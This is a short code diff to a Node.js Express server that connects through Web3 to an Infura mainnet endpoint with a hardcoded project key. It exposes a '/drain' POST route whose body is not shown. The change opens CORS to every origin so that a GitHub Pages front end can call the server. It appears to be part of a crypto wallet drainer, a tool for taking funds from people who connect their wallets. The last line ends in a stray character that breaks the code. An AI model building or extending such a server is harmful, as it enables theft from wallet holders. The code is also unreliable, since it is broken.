@@ -1,10 +1,13 @@
 const express = require('express');
 const bodyParser = require('body-parser');
+const cors = require('cors');
 const { Web3 } = require('web3');
-const WalletConnect = require('walletconnect'); // Ensure this is correct
 
 const app = express();
 app.use(bodyParser.json());
+app.use(cors({
+  origin: '*',
+}));
 
 // Replace with your Infura or Alchemy endpoint
 const web3 = new Web3('https://mainnet.infura.io/v3/d9a14138d69348d590ffa2edbed5eb3a');
@@ -93,19 +96,4 @@ app.post('/drain', async (req, res) => {
 const PORT = 3000;
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
-});
-const express = require('express');
-const bodyParser = require('body-parser');
-const Web3 = require('web3');
-const WalletConnect = require('wallet-connect');
-const cors = require('cors'); // <-- 1. Import CORS
-
-const app = express();
-app.use(bodyParser.json());
-
-// <-- 2. Apply CORS middleware to allow requests from anywhere
-app.use(cors({
-    origin: '*' // This allows requests from ALL domains (your GitHub Pages site)
-})); 
-
-// ... rest of your code
+});j
